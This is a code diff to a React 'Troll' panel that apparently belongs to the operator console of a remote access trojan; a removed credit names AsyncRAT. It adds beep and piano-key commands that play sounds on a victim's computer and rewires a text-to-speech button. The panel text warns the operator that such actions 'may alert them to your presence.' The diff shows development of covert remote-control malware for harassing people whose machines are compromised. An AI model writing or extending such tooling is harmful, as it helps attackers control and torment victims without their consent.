@@ -39,6 +39,8 @@ enum TrollCommandType {
   MuteVolume = "MuteVolume",
   UnmuteVolume = "UnmuteVolume",
   SpeakText = "SpeakText",
+  Beep = "Beep",
+  PianoKey = "PianoKey",
 }
 
 export const Troll = () => {
@@ -48,6 +50,8 @@ export const Troll = () => {
   );
   const [loading, setLoading] = useState<Record<string, boolean>>({});
   const [ttsText, setTtsText] = useState<string>("");
+  const [beepFrequency, setBeepFrequency] = useState<number>(1000);
+  const [beepDuration, setBeepDuration] = useState<number>(1000);
 
   const handleTrollCommand = async (command: TrollCommand) => {
     if (!addr) return;
@@ -122,6 +126,18 @@ export const Troll = () => {
       // Clear loading state
       setLoading((prev) => ({ ...prev, [command.type]: false }));
     }
+  };
+
+  const handlePianoKey = async (command: TrollCommand) => {
+    if (!addr) return;
+
+    await sendTrollCommand(addr, command);
+  };
+
+  const handleBeep = async (command: TrollCommand) => {
+    if (!addr) return;
+
+    await sendTrollCommand(addr, command);
   };
 
   const handleTrollCommandWithText = async (command: TrollCommand) => {
@@ -239,9 +255,9 @@ export const Troll = () => {
             </h3>
             <p className="text-yellow-100/70 text-md mt-0.5">
               These commands manipulate the client's interface in real-time.
-              Actions like hiding taskbars, controlling volume, and toggling
-              displays are visible to the user and may alert them to your
-              presence.
+              Actions like hiding taskbars, controlling volume, playing audio
+              and toggling displays are visible to the user and may alert them
+              to your presence.
             </p>
           </div>
         </div>
@@ -459,65 +475,28 @@ export const Troll = () => {
                   }
                 }}
               />
-              <button
-                onClick={() =>
-                  handleTrollCommandWithText({
-                    type: TrollCommandType.SpeakText,
-                    payload: ttsText,
-                  })
-                }
-                disabled={
-                  !ttsText.trim() || loading[TrollCommandType.SpeakText]
-                }
-                className={`p-2 rounded ${
-                  !ttsText.trim() || loading[TrollCommandType.SpeakText]
-                    ? "bg-gray-700 border-gray-600 text-gray-300 cursor-not-allowed"
-                    : "bg-accentx border-accent hover:bg-accent text-white"
-                }`}
-              >
-                {loading[TrollCommandType.SpeakText] ? (
-                  <svg
-                    className="animate-spin h-5 w-5 text-white"
-                    xmlns="http://www.w3.org/2000/svg"
-                    fill="none"
-                    viewBox="0 0 24 24"
-                  >
-                    <circle
-                      className="opacity-25"
-                      cx="12"
-                      cy="12"
-                      r="10"
-                      stroke="currentColor"
-                      strokeWidth="4"
-                    ></circle>
-                    <path
-                      className="opacity-75"
-                      fill="currentColor"
-                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                    ></path>
-                  </svg>
-                ) : (
-                  <svg
-                    xmlns="http://www.w3.org/2000/svg"
-                    className="h-5 w-5"
-                    viewBox="0 0 24 24"
-                    strokeWidth="1.5"
-                    stroke="currentColor"
-                    fill="none"
-                    strokeLinecap="round"
-                    strokeLinejoin="round"
-                  >
-                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
-                    <path d="M15 8a5 5 0 0 1 0 8" />
-                    <path d="M17.7 5a9 9 0 0 1 0 14" />
-                    <path d="M6 15h-2a1 1 0 0 1 -1 -1v-4a1 1 0 0 1 1 -1h2l3.5 -4.5a.8 .8 0 0 1 1.5 .5v14a.8 .8 0 0 1 -1.5 .5l-3.5 -4.5" />
-                  </svg>
-                )}
-              </button>
             </div>
+
             <p className="text-gray-400 text-xs">
               Make the client's computer speak the text.
             </p>
+
+            <button
+              onClick={() =>
+                handleTrollCommandWithText({
+                  type: TrollCommandType.SpeakText,
+                  payload: ttsText,
+                })
+              }
+              disabled={!ttsText.trim() || loading[TrollCommandType.SpeakText]}
+              className={`w-full py-2 px-3 rounded font-medium text-md transition-colors duration-200 ${
+                !ttsText.trim() || loading[TrollCommandType.SpeakText]
+                  ? "bg-gray-700 border border-gray-600 text-gray-300 cursor-not-allowed"
+                  : "bg-accentx hover:bg-white hover:text-black text-white border border-accentx cursor-pointer"
+              }`}
+            >
+              Send Text
+            </button>
           </div>
         </div>
 
@@ -526,23 +505,122 @@ export const Troll = () => {
           <div className="bg-primarybg border-b border-accentx px-2 py-1.5">
             <h3 className="text-white font-medium text-md">Piano Tiles</h3>
           </div>
-          <div className="p-2">
-            <div className="grid grid-cols-8 gap-1 mb-2">
-              {[...Array(16)].map((_, index) => (
-                <button
-                  key={index}
-                  className={`${
-                    index % 2 === 0 ? "bg-white" : "bg-gray-900"
-                  } h-12 ${
-                    index % 2 === 0 ? "border-gray-300" : "border-gray-800"
-                  } border rounded hover:opacity-80 transition-opacity`}
-                  onClick={() => {
-                    /* Piano tile click logic will go here */
-                  }}
-                ></button>
-              ))}
+          <div className="flex flex-col items-center justify-center">
+            <div className="piano pt-2">
+              <ul className="set">
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "1",
+                    })
+                  }
+                  className="white b"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "2",
+                    })
+                  }
+                  className="black as"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "3",
+                    })
+                  }
+                  className="white a"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "4",
+                    })
+                  }
+                  className="black gs"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "5",
+                    })
+                  }
+                  className="white g"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "6",
+                    })
+                  }
+                  className="black fs"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "7",
+                    })
+                  }
+                  className="white f"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "8",
+                    })
+                  }
+                  className="white e"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "9",
+                    })
+                  }
+                  className="black ds"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "10",
+                    })
+                  }
+                  className="white d"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "11",
+                    })
+                  }
+                  className="black cs"
+                ></li>
+                <li
+                  onClick={() =>
+                    handlePianoKey({
+                      type: TrollCommandType.PianoKey,
+                      payload: "12",
+                    })
+                  }
+                  className="white c"
+                ></li>
+              </ul>
             </div>
-            <p className="text-gray-400 text-xs">
+          </div>
+          <div className="pl-2 pt-1 pb-1">
+            <p className="text-gray-400 text-xs mt-2">
               Click keys to play sounds on the remote computer.
             </p>
           </div>
@@ -557,15 +635,15 @@ export const Troll = () => {
             <div className="grid grid-cols-2 gap-2">
               <div>
                 <label className="text-gray-400 text-xs block mb-1">
-                  Frequency (Hz)
+                  Frequency (Hz): {beepFrequency}
                 </label>
                 <input
                   type="range"
                   min="100"
                   max="5000"
                   className="w-full"
-                  // value={beepFrequency}
-                  // onChange={(e) => setBeepFrequency(parseInt(e.target.value))}
+                  value={beepFrequency}
+                  onChange={(e) => setBeepFrequency(parseInt(e.target.value))}
                 />
                 <div className="flex justify-between mt-1">
                   <span className="text-xs text-gray-400">100</span>
@@ -580,28 +658,26 @@ export const Troll = () => {
                   type="number"
                   min="100"
                   max="5000"
-                  // value={beepDuration}
-                  // onChange={(e) => setBeepDuration(parseInt(e.target.value))}
+                  value={beepDuration}
+                  onChange={(e) => setBeepDuration(parseInt(e.target.value))}
                   className="w-full p-1.5 bg-secondarybg text-white border border-accentx rounded text-sm"
                   placeholder="Duration"
                 />
               </div>
             </div>
             <button
-              // onClick={handleBeepSubmit}
-              className="w-full py-1 px-2 bg-accentx hover:bg-accent text-white rounded transition-all duration-200"
+              onClick={() =>
+                handleBeep({
+                  type: TrollCommandType.Beep,
+                  payload: `${beepFrequency}:${beepDuration}`,
+                })
+              }
+              className="cursor-pointer w-full py-2 px-3 rounded font-medium text-md transition-colors duration-200 border border-accentx bg-accentx hover:bg-white hover:text-black text-white"
             >
               Play Beep
             </button>
           </div>
         </div>
-      </div>
-
-      {/* Credits */}
-      <div className="mt-auto pt-4 border-t border-gray-800">
-        <p className="text-xs text-gray-500">
-          © AsyncRAT - All rights reserved.
-        </p>
       </div>
     </div>
   );
